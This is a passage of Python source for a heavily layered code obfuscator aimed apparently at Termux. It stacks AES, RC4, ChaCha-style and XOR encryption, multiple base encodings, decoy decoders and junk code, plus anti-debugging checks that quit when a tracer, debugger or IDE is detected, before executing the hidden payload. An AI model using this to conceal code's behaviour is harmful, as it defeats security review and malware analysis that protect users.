            f"            {v[8]}[0],{v[8]}[4],{v[8]}[8],{v[8]}[12]={v[2]}(*[{v[8]}[i] for i in [0,4,8,12]])",
            f"            {v[8]}[1],{v[8]}[5],{v[8]}[9],{v[8]}[13]={v[2]}(*[{v[8]}[i] for i in [1,5,9,13]])",
            f"            {v[8]}[2],{v[8]}[6],{v[8]}[10],{v[8]}[14]={v[2]}(*[{v[8]}[i] for i in [2,6,10,14]])",
            f"            {v[8]}[3],{v[8]}[7],{v[8]}[11],{v[8]}[15]={v[2]}(*[{v[8]}[i] for i in [3,7,11,15]])",
            f"            {v[8]}[0],{v[8]}[5],{v[8]}[10],{v[8]}[15]={v[2]}(*[{v[8]}[i] for i in [0,5,10,15]])",
            f"            {v[8]}[1],{v[8]}[6],{v[8]}[11],{v[8]}[12]={v[2]}(*[{v[8]}[i] for i in [1,6,11,12]])",
            f"            {v[8]}[2],{v[8]}[7],{v[8]}[8],{v[8]}[13]={v[2]}(*[{v[8]}[i] for i in [2,7,8,13]])",
            f"            {v[8]}[3],{v[8]}[4],{v[8]}[9],{v[8]}[14]={v[2]}(*[{v[8]}[i] for i in [3,4,9,14]])",
            f"        {v[9]}=[({v[8]}[i]+{v[7]}[i])&0xFFFFFFFF for i in range(16)]",
            f"        for w in {v[9]}:{v[5]}+=w.to_bytes(4,'little')",
            f"        {v[6]}+=1",
            f"    return bytes(a^b for a,b in zip({v_data},{v[5]}[:len({v_data})]))",
            f"{v[10]}=bytes.fromhex('{key_hex}')",
            f"{v[11]}=bytes.fromhex('{nonce_hex}')",
            f"{v_data}={v[0]}({v[10]},{v[11]})",
        ]
        return lines, v_data

    def _ultra_encode(self, code):
        try:
            raw_bytecode = marshal.dumps(compile(code, '<obfuscated>', 'exec'))
            is_marshal = True
        except:
            raw_bytecode = code.encode('utf-8')
            is_marshal = False
        raw_bytecode = code.encode('utf-8')
        is_marshal = False

        # Layer 0: bytecode mutation
        bytecode, mutation_key = self._mutate_bytecode(raw_bytecode)

        # Layer 1: BLAKE2b integrity tag dari plaintext (sebelum enkripsi)
        blake2_tag = hashlib.blake2b(bytecode, digest_size=32).digest()

        # Layer 2: ChaCha20-style stream cipher — encrypt plaintext
        chacha_key   = os.urandom(32)
        chacha_nonce = os.urandom(12)
        bytecode_enc = self._chacha_encrypt(bytecode, chacha_key, chacha_nonce)

        # Gabungkan: tag (dari plaintext) + chacha_ciphertext
        # Decoder: chacha_decrypt → bandingkan BLAKE2 dari hasilnya dengan tag
        bytecode = blake2_tag + bytecode_enc

        # Layer 3: AES-CBC
        aes_key = os.urandom(32)
        encrypted = self._aes_encrypt(bytecode, aes_key)
        
        # Layer 4: PBKDF2 + HMAC integrity
        key_derivation_salt = os.urandom(16)
        derived_key = hashlib.pbkdf2_hmac('sha256', aes_key, key_derivation_salt, 200000, dklen=32)
        hmac_key = hashlib.sha256(derived_key).digest()
        signature = hmac.new(hmac_key, encrypted, hashlib.sha256).digest()
        payload = signature + key_derivation_salt + encrypted

        # Layer 5: Multi-key XOR
        xor_keys = [random.randint(1, 255) for _ in range(11)]
        for idx, key in enumerate(xor_keys):
            payload = bytes([b ^ key ^ (idx * 19) ^ ((idx * idx) % 256) for b in payload])

        # Layer 6: Bit rotation
        rotation_left = random.randint(3, 7)
        rotation_right = 8 - rotation_left
        payload = bytes([(b << rotation_left | b >> rotation_right) & 0xFF for b in payload])

        # Layer 7: Shuffle
        shuffle_seed = random.randint(10000, 99999)
        payload_list = list(payload)
        random.seed(shuffle_seed)
        indices = list(range(len(payload_list)))
        random.shuffle(indices)
        shuffled = bytes([payload_list[i] for i in indices])
        random.seed(self.entropy_seed)

        # Layer 8: Substitution
        substitution_map = list(range(256))
        random.seed(shuffle_seed ^ 0xDEADBEEF)
        random.shuffle(substitution_map)
        substituted = bytes([substitution_map[b] for b in shuffled])
        random.seed(self.entropy_seed)

        # Layer 9: RC4
        rc4_key = os.urandom(random.randint(16, 32))
        rc4_encrypted = self._rc4(rc4_key, substituted)

        # Layer 10: Positional Caesar
        caesar_seed = random.randint(100000, 999999)
        caesar_applied = self._positional_caesar(rc4_encrypted, caesar_seed)

        # Layer 11: Interleave + per-stream compression
        interleave_n = 3
        streams = self._interleave(caesar_applied, interleave_n)
        total_len = len(caesar_applied)

        import struct as _struct
        packed_streams = b''
        for s in streams:
            compressed_s = zlib.compress(s, 9)
            packed_streams += _struct.pack('>I', len(compressed_s)) + compressed_s

        # Layer 12: Double compress
        compressed = self._double_compress(packed_streams)

        # Layer 13: Multi-base encoding
        stage1 = base64.b64encode(compressed)
        stage2 = base64.b85encode(stage1)
        stage3 = base64.b32encode(stage2)
        stage4 = base64.b16encode(stage3)
        final  = stage4[::-1]

        return (final, is_marshal, xor_keys, rotation_left, shuffle_seed,
                aes_key, mutation_key, rc4_key, caesar_seed, interleave_n, total_len,
                chacha_key, chacha_nonce)
    
    def _create_death_traps(self):
        traps = []
        
        trap_count = random.randint(50, 70)
        
        for i in range(trap_count):
            trap_name = self._quantum_name(15)
            
            trap_types = [
                f"{trap_name}=lambda:__import__('inspect').currentframe().f_back.f_code.co_name if __import__('inspect').currentframe() else 'none'",
                f"{trap_name}=lambda x:hash(str(x))%{random.randint(10000,99999)} if x else {random.randint(1,999)}",
                f"{trap_name}=(lambda f:f(f))(lambda x:lambda:x(x)if {random.random()}>0.5 else None)",
                f"{trap_name}= [x**{random.randint(2,7)} ^ {random.randint(100,999)} for x in range({random.randint(10,50)})]",
                f"{trap_name}= {{k:v for k,v in zip(range({random.randint(20,50)}),[hash(i)for i in range({random.randint(20,50)})])}}",
                f"{trap_name}= (x * {random.randint(2,9)} for x in range({random.randint(30,80)}))",
                f"{trap_name}= [getattr(__builtins__, x) for x in dir(__builtins__) if not x.startswith('_')][:{random.randint(10,30)}]",
                f"{trap_name}=lambda obj:type(obj).__name__ if hasattr(obj,'__name__')else str(type(obj))",
                f"{trap_name}=lambda s:hashlib.sha256(s.encode()).hexdigest()if isinstance(s,str)else''",
                f"{trap_name}= {{chr(i):i for i in range({random.randint(65,90)},{random.randint(91,122)})}}",
                f"{trap_name}=lambda l:[l[i:i+{random.randint(2,5)}]for i in range(0,len(l),{random.randint(2,5)})]if hasattr(l,'__getitem__')else[]",
                f"{trap_name}= __import__('os').urandom({random.randint(16,64)})",
                f"{trap_name}=type('_V3_',(object,),{{'__repr__':lambda s:hex({random.randint(0x1000,0xFFFF)}),'_x':bytes([{random.randint(0,255)},{random.randint(0,255)}])}})()",
                f"{trap_name}=list(map(lambda b:b^{random.randint(1,255)},__import__('os').urandom({random.randint(8,32)})))",
                f"{trap_name}={{i:(lambda x:x*x+{random.randint(1,99)})(i)for i in range({random.randint(10,40)})}}",
                f"{trap_name}=__import__('struct').pack('>I{random.randint(2,8)}s',{random.randint(1000,9999)},b'{"".join(random.choices(string.ascii_letters,k=random.randint(2,8))).encode().hex()}'[:4])",
                f"{trap_name}=__import__('hashlib').blake2b(b'{os.urandom(8).hex()}',digest_size={random.choice([16,20,32])}).hexdigest()",
            ]
            
            traps.append(random.choice(trap_types))
        
        return traps
    
    def _create_fake_decoder_chain(self):
        fakes = []
        
        for _ in range(random.randint(18, 28)):
            fake_name = self._quantum_name(12)
            
            fake_ops = [
                f"{fake_name}=lambda d:base64.b64decode(d)if isinstance(d,bytes)else d",
                f"{fake_name}=lambda d:zlib.decompress(d)if len(d)>10 else d",
                f"{fake_name}=lambda d:bytes([b ^ {random.randint(1,255)} for b in d]) if isinstance(d, bytes) else d",
                f"{fake_name}=lambda d:d[::-1] if hasattr(d, '__getitem__') else d",
                f"{fake_name}=lambda d:bytearray(d).decode('utf-8') if isinstance(d, bytes) else str(d)",
                f"{fake_name}=lambda d:marshal.loads(d) if isinstance(d, bytes) and len(d) > 4 else d",
                f"{fake_name}=lambda d:hashlib.md5(d).digest() if isinstance(d, bytes) else d",
                f"{fake_name}=lambda d:bytes([(b << {random.randint(1,7)} | b >> {random.randint(1,7)}) & 0xFF for b in d]) if isinstance(d, bytes) else d",
                f"{fake_name}=lambda k,d:bytes([d[i] ^ k[i % len(k)] for i in range(len(d))]) if isinstance(d, bytes) else d",
                f"{fake_name}=lambda d:__import__('zlib').decompress(__import__('zlib').compress(d, {random.randint(1,9)})) if isinstance(d, bytes) else d",
                f"{fake_name}=lambda d:bytes([b ^ {random.randint(1,255)} ^ (i * {random.randint(1,7)} % 256) for i, b in enumerate(d)]) if isinstance(d, bytes) else d",
                f"{fake_name}=lambda d:__import__('hashlib').sha512(d).digest()if isinstance(d,bytes)else d",
                f"{fake_name}=lambda d,k=b'{os.urandom(4).hex()}':bytes([a^b for a,b in zip(d,k*(len(d)//len(k)+1))])if isinstance(d,bytes)else d",
            ]
            
            fakes.append(random.choice(fake_ops))
        
        return fakes
    
    def _create_termux_integrity_checks(self):
        check_vars = [self._quantum_name(10) for _ in range(25)]
        
        integrity_checks = [
            f"{check_vars[0]}=__import__('sys').version_info.major*1000+__import__('sys').version_info.minor",
            f"if {check_vars[0]}<3000:raise SystemExit(chr(80)+chr(121)+chr(116)+chr(104)+chr(111)+chr(110)+chr(32)+chr(51)+chr(43)+chr(32)+chr(114)+chr(101)+chr(113)+chr(117)+chr(105)+chr(114)+chr(101)+chr(100))",
            f"{check_vars[1]}=len([x for x in dir(__builtins__)if not x.startswith('_')])",
            f"if {check_vars[1]}<50:raise SystemExit(chr(69)+chr(110)+chr(118)+chr(105)+chr(114)+chr(111)+chr(110)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(99)+chr(111)+chr(109)+chr(112)+chr(114)+chr(111)+chr(109)+chr(105)+chr(115)+chr(101)+chr(100))",
            f"{check_vars[2]}=hash(__name__)%{random.randint(10000,99999)}",
            f"if {check_vars[2]}<0:raise SystemExit(chr(72)+chr(97)+chr(115)+chr(104)+chr(32)+chr(118)+chr(101)+chr(114)+chr(105)+chr(102)+chr(105)+chr(99)+chr(97)+chr(116)+chr(105)+chr(111)+chr(110)+chr(32)+chr(102)+chr(97)+chr(105)+chr(108)+chr(101)+chr(100))",
            f"{check_vars[3]}=__import__('sys').getrecursionlimit()",
            f"if {check_vars[3]}<100:raise SystemExit(chr(82)+chr(101)+chr(99)+chr(117)+chr(114)+chr(115)+chr(105)+chr(111)+chr(110)+chr(32)+chr(108)+chr(105)+chr(109)+chr(105)+chr(116)+chr(32)+chr(116)+chr(111)+chr(111)+chr(32)+chr(108)+chr(111)+chr(119))",
            f"{check_vars[4]}=len(__builtins__.__dict__)",
            f"if {check_vars[4]}<100:raise SystemExit(chr(66)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(32)+chr(109)+chr(111)+chr(100)+chr(105)+chr(102)+chr(105)+chr(101)+chr(100))",
            f"{check_vars[5]}=hasattr(__builtins__,'exec')and hasattr(__builtins__,'eval')",
            f"if not {check_vars[5]}:raise SystemExit(chr(67)+chr(114)+chr(105)+chr(116)+chr(105)+chr(99)+chr(97)+chr(108)+chr(32)+chr(102)+chr(117)+chr(110)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110)+chr(115)+chr(32)+chr(109)+chr(105)+chr(115)+chr(115)+chr(105)+chr(110)+chr(103))",
            f"{check_vars[6]}=__import__('os').path.exists('/proc/self/status')if __import__('os').name=='posix'else True",
            f"{check_vars[7]}=sum([ord(c)for c in __name__[:5]])if __name__ else {random.randint(100,999)}",
            f"{check_vars[8]}={random.randint(50000,99999)}*{random.randint(100,999)}",
            f"{check_vars[9]}={check_vars[8]}//{random.randint(100,500)}",
            f"{check_vars[10]}= [x for x in range({random.randint(10,30)})if x%2==0]",
            f"if len({check_vars[10]})<3:pass",
            f"try:",
            f"    {check_vars[11]}=__import__('sys').settrace",
            f"    if {check_vars[11]} is not None:",
            f"        __import__('sys').settrace(None)",
            f"except:pass",
            f"{check_vars[12]}=__import__('os').path.exists('/data/data/com.termux')or __import__('os').path.exists('/data/data/com.termux.x11')",
            f"{check_vars[13]}=__import__('platform').machine()in['aarch64','armv7l','armv8l','arm64']",
            f"{check_vars[14]}=__import__('time').time()",
            f"{check_vars[15]}=__import__('os').getuid()if hasattr(__import__('os'),'getuid')else 0",
            f"if {check_vars[15]}==0:pass",
            f"{check_vars[16]}=__import__('hashlib').sha256(str({check_vars[14]}).encode()).hexdigest()[:8]",
            f"{check_vars[17]}=__import__('sys').flags.optimize",
            f"if {check_vars[17]}>1:raise SystemExit(chr(79)+chr(112)+chr(116)+chr(105)+chr(109)+chr(105)+chr(122)+chr(101)+chr(114)+chr(32)+chr(100)+chr(101)+chr(116)+chr(101)+chr(99)+chr(116)+chr(101)+chr(100))",
            f"{check_vars[18]}=len(__import__('gc').get_objects())>{random.randint(100,500)}",
            f"{check_vars[19]}=__import__('os').environ.get('PYTHONDEBUG','')!='{random.randint(1,9)}'",
            f"{check_vars[20]}=not bool(__import__('sys').flags.inspect)",
            f"if not {check_vars[20]}:raise SystemExit(chr(73)+chr(110)+chr(115)+chr(112)+chr(101)+chr(99)+chr(116)+chr(32)+chr(109)+chr(111)+chr(100)+chr(101)+chr(32)+chr(100)+chr(101)+chr(116)+chr(101)+chr(99)+chr(116)+chr(101)+chr(100))",
        ]
        
        return integrity_checks
    
    def _create_anti_debug_layer(self):
        v = [self._quantum_name(8) for _ in range(30)]

        # Helper: encode exit message as chr() chain
        def _ec(s):
            return '+'.join(f'chr({ord(c)})' for c in s)

        # Timing threshold — randomized per build agar threshold-nya unpredictable
        timing_threshold = round(random.uniform(0.08, 0.18), 3)
        timing_ops       = random.randint(800, 1500)

        antidebug = [
            # ── 1. sys.gettrace ──────────────────────────────────────────────
            "try:",
            f"    {v[0]}=__import__('sys').gettrace()",
            f"    if {v[0]} is not None:raise SystemExit({_ec('TraceDetected')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 2. sys.settrace null-out (aktif disable tracer jika ada) ─────
            "try:",
            f"    __import__('sys').settrace(None)",
            f"    __import__('threading').settrace(None)",
            "except:pass",

            # ── 3. Timing check (lebih sensitif + random threshold) ──────────
            f"{v[1]}=__import__('time').perf_counter()",
            f"{v[2]}=sum(x*x for x in range({timing_ops}))",
            f"{v[3]}=__import__('time').perf_counter()",
            f"if ({v[3]}-{v[1]})>{timing_threshold}:raise SystemExit({_ec('TimingAnomaly')})",

            # ── 4. Frame depth check (debugger biasanya tambah frame) ────────
            "try:",
            f"    {v[4]}=__import__('inspect').stack()",
            f"    if len({v[4]})>{random.randint(18,28)}:raise SystemExit({_ec('StackAnomaly')})",
            f"    {v[5]}=[f.f_code.co_name for f in {v[4]}]",
            f"    if any(x in {v[5]} for x in ['settrace','gettrace','runcall','dispatch_call','_trace_dispatch','pydevd','bdb','pdb']):raise SystemExit({_ec('DebuggerFrame')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 5. IDE/debugger environment variable detection ────────────────
            "try:",
            f"    {v[6]}=__import__('os').environ",
            f"    {v[7]}=['PYDEVD_USE_FRAME_EVAL','PYCHARM_HOSTED','VSCODE_PID','PYTHONBREAKPOINT','WINPYCHARM_HOSTED','_VSCODE_PORT','DEBUGPY_RUNNING','PYDEVD_DISABLE_FILE_VALIDATION']",
            f"    if any(k in {v[6]} for k in {v[7]}):raise SystemExit({_ec('IDEDetected')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 6. Bytecode co_code length tampering check ───────────────────
            "try:",
            f"    {v[8]}=__import__('sys').modules.get('__main__',None)",
            f"    if {v[8]} and hasattr({v[8]},'__spec__') and {v[8]}.__spec__ is not None:",
            f"        if str(type({v[8]}.__spec__).__name__) not in ['ModuleSpec','NoneType']:raise SystemExit({_ec('ModuleAnomaly')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 7. sys.flags.debug / inspect check ──────────────────────────
            "try:",
            f"    if __import__('sys').flags.debug!=0:raise SystemExit({_ec('DebugFlagSet')})",
            f"    if __import__('sys').flags.inspect!=0:raise SystemExit({_ec('InspectFlagSet')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 8. Audit hook injection detection (Python 3.8+) ─────────────
            "try:",
            f"    {v[9]}=[]",
            f"    def {v[10]}(e,a):{v[9]}.append(e)",
            f"    __import__('sys').addaudithook({v[10]})",
            f"    if len({v[9]})>0:pass",
            "except:pass",

            # ── 9. /proc/self/status TracerPid check (Linux/Termux) ─────────
            "try:",
            f"    if __import__('os').path.exists('/proc/self/status'):",
            f"        {v[11]}=open('/proc/self/status').read()",
            f"        {v[12]}=[l for l in {v[11]}.splitlines() if l.startswith('TracerPid')]",
            f"        if {v[12]} and int({v[12]}[0].split(':')[1].strip())!=0:raise SystemExit({_ec('TracerAttached')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 10. gc.get_referrers depth anomaly ──────────────────────────
            "try:",
            f"    {v[13]}=len(__import__('gc').get_objects())",
            f"    if {v[13]}<{random.randint(50,150)}:raise SystemExit({_ec('EnvCompromised')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 11. Double-check gettrace setelah semua setup ────────────────
            "try:",
            f"    if __import__('sys').gettrace() is not None:raise SystemExit({_ec('LateTraceDetected')})",
            "except SystemExit:raise",
            "except:pass",

            # ── 12. Randomized decoy computation (confuse dynamic analysis) ──
            f"{v[14]}=__import__('hashlib').sha256(str(__import__('time').time_ns()).encode()).digest()",
            f"{v[15]}=bytes([b^{random.randint(1,255)} for b in {v[14]}])",
            f"{v[16]}=int.from_bytes({v[15]}[:4],'big')%{random.randint(10000,99999)}",
        ]

        return antidebug
    
    def _create_fake_imports(self):
        modules = [
            ('os',       self._quantum_name()),
            ('sys',      self._quantum_name()),
            ('gc',       self._quantum_name()),
            ('io',       self._quantum_name()),
            ('re',       self._quantum_name()),
            ('math',     self._quantum_name()),
            ('types',    self._quantum_name()),
            ('abc',      self._quantum_name()),
            ('copy',     self._quantum_name()),
            ('functools',self._quantum_name()),
            ('collections', self._quantum_name()),
            ('itertools', self._quantum_name()),
            ('threading', self._quantum_name()),
            ('weakref',  self._quantum_name()),
        ]
        import_lines = []
        for mod, alias in modules:
            obf_mod = self._obf_str_to_chrexpr(mod)
            import_lines.append(f"{alias}=__import__({obf_mod})")
        random.shuffle(import_lines)

        post_lines = []
        for mod, alias in modules[:4]:
            attr = random.choice(['__name__','__spec__','__loader__','__package__'])
            vattr = self._shadow_name()
            obf_attr = self._obf_str_to_chrexpr(attr)
            post_lines.append(f"{vattr}=getattr({alias},{obf_attr},None)")
        for _ in range(random.randint(6, 12)):
            vd = self._shadow_name()
            style = random.randint(0, 3)
            if style == 0:
                post_lines.append(f"{vd}=None")
            elif style == 1:
                fake_name = f"_N{random.randint(100,999)}_"
                post_lines.append(f"{vd}=type('{fake_name}',(),{{}})()")
            elif style == 2:
                post_lines.append(f"{vd}=bytes([{random.randint(0,255)},{random.randint(0,255)},{random.randint(0,255)}])")
            else:
                post_lines.append(f"{vd}=lambda *_:None")
        random.shuffle(post_lines)
        return import_lines + post_lines

    def _build_nested_exec(self, decoder_steps, exec_lines, v_antidebug, antidebug_checks, v_temp):
        import base64 as _b64mod
        import zlib as _zlibmod
        import hashlib as _hlmod

        antidebug_var  = self._shadow_name()
        inner_code_var = self._shadow_name()
        wrap_var       = self._shadow_name()
        gate_var       = self._shadow_name()
        key_var        = self._shadow_name()
        hash_gate_var  = self._shadow_name()
        hash_val_var   = self._shadow_name()
        mid_var        = self._shadow_name()
        shell_var      = self._shadow_name()
        zdata_var      = self._shadow_name()
        xkey_var       = self._shadow_name()
        xval_var       = self._shadow_name()

        antidebug_src = "\n".join(antidebug_checks)
        antidebug_raw = _zlibmod.compress(antidebug_src.encode(), 9)
        antidebug_b64 = _b64mod.b64encode(antidebug_raw).decode()

        decoder_src = "\n".join(decoder_steps + exec_lines)
        compressed_decoder = _zlibmod.compress(decoder_src.encode(), 9)
        xor_mask = random.randint(1, 254)
        xored_decoder = bytes([b ^ xor_mask for b in compressed_decoder])
        decoder_b64 = _b64mod.b64encode(xored_decoder).decode()

        chunk_size = random.randint(55, 95)
        chunks = [decoder_b64[i:i+chunk_size] for i in range(0, len(decoder_b64), chunk_size)]
        chunk_vars = [self._shadow_name() for _ in chunks]

        adc_chunks = [antidebug_b64[i:i+chunk_size] for i in range(0, len(antidebug_b64), chunk_size)]
        adc_vars = [self._shadow_name() for _ in adc_chunks]

        fake_chunk_count = random.randint(8, 16)
        fake_vars  = [self._shadow_name() for _ in range(fake_chunk_count)]
        fake_strs  = [_b64mod.b64encode(os.urandom(random.randint(20,60))).decode()[:random.randint(20,55)] for _ in range(fake_chunk_count)]

        lines = []

        all_items = list(zip(chunk_vars, chunks)) + list(zip(adc_vars, adc_chunks)) + list(zip(fake_vars, fake_strs))
        random.shuffle(all_items)
        for vn, ch in all_items:
            lines.append(f"{vn}='{ch}'")

        joined_var = self._shadow_name()
        lines.append(f"{joined_var}=" + "+".join(chunk_vars))

        adc_joined = self._shadow_name()
        lines.append(f"{adc_joined}=" + "+".join(adc_vars))

        obf_b64  = self._obf_str_to_chrexpr('base64')
        obf_utf8 = self._obf_str_to_chrexpr('utf-8')
        obf_zlib = self._obf_str_to_chrexpr('zlib')

        gate_seed = random.randint(10000, 99999)
        gate_xor  = random.randint(1, 127)
        gate_encoded = [b ^ gate_xor for b in str(gate_seed).encode()]

        decoder_hash = _hlmod.sha256(decoder_b64.encode()).hexdigest()
        inner_hash   = _hlmod.sha256(decoder_src.encode()).hexdigest()[:16]

        lines.extend([
            f"{zdata_var}=__import__({obf_b64}).b64decode({adc_joined})",
            f"{antidebug_var}=__import__({obf_zlib}).decompress({zdata_var}).decode({obf_utf8})",
            f"{self._indirect_exec(antidebug_var)}",
            f"{key_var}=bytes([b^{gate_xor} for b in bytes({gate_encoded})])",
            f"{gate_var}=int({key_var}.decode())=={gate_seed}",
            f"{hash_val_var}=__import__({self._obf_str_to_chrexpr('hashlib')}).sha256({joined_var}.encode()).hexdigest()",
            f"{hash_gate_var}={hash_val_var}=='{decoder_hash}'",
            f"{xkey_var}={self._obf_int(xor_mask)}",
            f"{mid_var}=bytes([b^{xkey_var} for b in __import__({obf_b64}).b64decode({joined_var})]) if ({gate_var} and {hash_gate_var}) else b''",
            f"{inner_code_var}=__import__({obf_zlib}).decompress({mid_var}).decode({obf_utf8}) if {mid_var} else ''",
            f"{xval_var}=__import__({self._obf_str_to_chrexpr('hashlib')}).sha256({inner_code_var}.encode()).hexdigest()[:16]",
            f"if {xval_var}=='{inner_hash}':",
        ])

        staged = self._build_staged_exec_call('', inner_code_var)
        for sl in staged:
            lines.append(f"        {sl}")

        return lines

    def obfuscate(self, source_code):
        (encoded, is_marshal, xor_keys, rotation, shuffle_seed,
         aes_key, mutation_key, rc4_key, caesar_seed,
         interleave_n, total_len,
         chacha_key, chacha_nonce) = self._ultra_encode(source_code)
        
        v_class    = self._quantum_name() + '_PROTECTED'
        v_init     = self._quantum_name()
        v_exec     = self._quantum_name()
        v_verify   = self._quantum_name()
        v_decode   = self._quantum_name()
        v_antidebug= self._quantum_name()
        
        v_temp   = [self._quantum_name() for _ in range(60)]
        v_b64    = self._quantum_name()
        v_zlib   = self._quantum_name()
        v_marshal= self._quantum_name()
        v_hashlib= self._quantum_name()
        v_hmac   = self._quantum_name()
        v_time   = self._quantum_name()
        v_struct = self._quantum_name()
        
        death_traps      = self._create_death_traps()
        multilayer_noise = self._create_multilayer_noise()
        fake_decoders    = self._create_fake_decoder_chain()
        fake_vm_lines    = self._create_fake_vm()
        integrity_checks = self._create_termux_integrity_checks()
        antidebug_checks = self._create_anti_debug_layer()
        opaque_preds     = self._opaque_predicates(random.randint(6, 10))
        
        payload_hex    = encoded.hex()
        current_date   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        aes_key_hex    = aes_key.hex()
        mutation_key_hex = mutation_key.hex()
        rc4_key_hex    = rc4_key.hex()
        substitution_seed = shuffle_seed ^ 0xDEADBEEF
        chacha_key_hex   = chacha_key.hex()
        chacha_nonce_hex = chacha_nonce.hex()

        obf_sha256  = self._obf_str_to_chrexpr('sha256')
        obf_utf8    = self._obf_str_to_chrexpr('utf-8')
        obf_big     = self._obf_str_to_chrexpr('big')

        chunks = self._split_payload_hex(payload_hex)
        integrity_hash = hashlib.sha256(payload_hex.encode()).hexdigest()

        decoder_steps = [
            f"{v_b64}=__import__({self._obf_str_to_chrexpr('base64')})",
            f"{v_zlib}=__import__({self._obf_str_to_chrexpr('zlib')})",
            f"{v_marshal}=__import__({self._obf_str_to_chrexpr('marshal')})",
            f"{v_hashlib}=__import__({self._obf_str_to_chrexpr('hashlib')})",
            f"{v_hmac}=__import__({self._obf_str_to_chrexpr('hmac')})",
            f"{v_time}=__import__({self._obf_str_to_chrexpr('time')})",
            f"{v_struct}=__import__({self._obf_str_to_chrexpr('struct')})",
        ]

        chunk_var_names = [self._shadow_name() for _ in chunks]
        chunk_pairs = list(zip(chunk_var_names, chunks))
        display_pairs = chunk_pairs[:]
        random.shuffle(display_pairs)
        for vn, ch in display_pairs:
            decoder_steps.append(f"{vn}='{ch}'")
        for _ in range(random.randint(3, 7)):
            fake_vn = self._shadow_name()
            decoder_steps.append(f"{fake_vn}=None")
        hex_joined_var = self._shadow_name()
        decoder_steps.append(f"{hex_joined_var}=" + "+".join(chunk_var_names))

        vi_hash = self._shadow_name()
        decoder_steps.append(f"{vi_hash}={v_hashlib}.sha256({hex_joined_var}.encode()).hexdigest()")
        decoder_steps.append(f"if {vi_hash}!='{integrity_hash}':raise SystemExit({self._obf_str_to_chrexpr('Payload tampered')})")

        bytes_var = v_temp[0]
        decoder_steps.append(f"{bytes_var}=bytes.fromhex({hex_joined_var})")

        decoder_steps.extend([
            f"{v_temp[1]}={bytes_var}[::-1]",
            f"{v_temp[2]}={v_b64}.b16decode({v_temp[1]})",
            f"{v_temp[3]}={v_b64}.b32decode({v_temp[2]})",
            f"{v_temp[4]}={v_b64}.b85decode({v_temp[3]})",
            f"{v_temp[5]}={v_b64}.b64decode({v_temp[4]})",
        ])

        decoder_steps.extend([
            f"{v_temp[6]}={v_zlib}.decompress({v_temp[5]})",
            f"{v_temp[6]}={v_zlib}.decompress({v_temp[6]})",
        ])

        v_offset  = self._quantum_name(5)
        v_slen    = self._quantum_name(5)
        v_sdata   = self._quantum_name(5)
        v_streams = self._quantum_name(6)
        v_idx_s   = self._quantum_name(4)
        v_idx_b   = self._quantum_name(4)
        v_bval    = self._quantum_name(4)
        v_result  = self._quantum_name(6)
        v_ntotal  = self._quantum_name(5)
        decoder_steps.extend([
            f"{v_offset}=0",
            f"{v_streams}=[]",
            f"for {v_idx_s} in range({interleave_n}):",
            f"    {v_slen}={v_struct}.unpack('>I',{v_temp[6]}[{v_offset}:{v_offset}+4])[0]",
            f"    {v_offset}+=4",
            f"    {v_sdata}={v_zlib}.decompress({v_temp[6]}[{v_offset}:{v_offset}+{v_slen}])",
            f"    {v_streams}.append({v_sdata})",
            f"    {v_offset}+={v_slen}",
            f"{v_ntotal}={total_len}",
            f"{v_result}=bytearray({v_ntotal})",
            f"for {v_idx_s},{v_sdata} in enumerate({v_streams}):",
            f"    for {v_idx_b},{v_bval} in enumerate({v_sdata}):",
            f"        {v_result}[{v_idx_s}+{v_idx_b}*{interleave_n}]={v_bval}",
            f"{v_temp[6]}=bytes({v_result})",
        ])

        caesar_lines, v_after_caesar = self._rev_positional_caesar_runtime(v_temp[6], caesar_seed)
        decoder_steps.extend(caesar_lines)

        rc4_lines, v_after_rc4 = self._rc4_runtime_code(v_after_caesar, rc4_key_hex)
        decoder_steps.extend(rc4_lines)

        decoder_steps.extend([
            f"{v_temp[30]}=list(range(256))",
            f"__import__({self._obf_str_to_chrexpr('random')}).seed({self._obf_int(substitution_seed)})",
            f"__import__({self._obf_str_to_chrexpr('random')}).shuffle({v_temp[30]})",
            f"{v_temp[31]}={{v:i for i,v in enumerate({v_temp[30]})}}",
            f"{v_temp[7]}=bytes([{v_temp[31]}[b] for b in {v_after_rc4}])",
        ])

        decoder_steps.extend([
            f"{v_temp[8]}=list({v_temp[7]})",
            f"{v_temp[9]}=list(range(len({v_temp[8]})))",
            f"__import__({self._obf_str_to_chrexpr('random')}).seed({self._obf_int(shuffle_seed)})",
            f"__import__({self._obf_str_to_chrexpr('random')}).shuffle({v_temp[9]})",
            f"{v_temp[10]}={{v:i for i,v in enumerate({v_temp[9]})}}",
            f"{v_temp[11]}=bytes([{v_temp[8]}[{v_temp[10]}[i]] for i in range(len({v_temp[8]}))])",
        ])

        decoder_steps.append(
            f"{v_temp[12]}=bytes([(b >> {self._obf_int(rotation)} | b << {self._obf_int(8-rotation)}) & 0xFF for b in {v_temp[11]}])"
        )

        xor_decrypt_code = v_temp[12]
        for idx in range(len(xor_keys) - 1, -1, -1):
            key = xor_keys[idx]
            next_var = v_temp[14 + (len(xor_keys) - 1 - idx)]
            decoder_steps.append(
                f"{next_var}=bytes([b ^ {self._obf_int(key)} ^ ({self._obf_int(idx)}*{self._obf_int(19)}) ^ (({self._obf_int(idx)}*{self._obf_int(idx)})%{self._obf_int(256)}) for b in {xor_decrypt_code}])"
            )
            xor_decrypt_code = next_var

        final_decrypted = xor_decrypt_code

        decoder_steps.extend([
            f"{v_temp[26]}={final_decrypted}[:{self._obf_int(32)}]",
            f"{v_temp[27]}={final_decrypted}[{self._obf_int(32)}:{self._obf_int(48)}]",
            f"{v_temp[28]}={final_decrypted}[{self._obf_int(48)}:]",
            f"{v_temp[32]}=bytes.fromhex('{aes_key_hex}')",
            f"{v_temp[33]}={v_hashlib}.pbkdf2_hmac({obf_sha256},{v_temp[32]},{v_temp[27]},{self._obf_int(200000)},dklen={self._obf_int(32)})",
            f"{v_temp[34]}={v_hashlib}.sha256({v_temp[33]}).digest()",
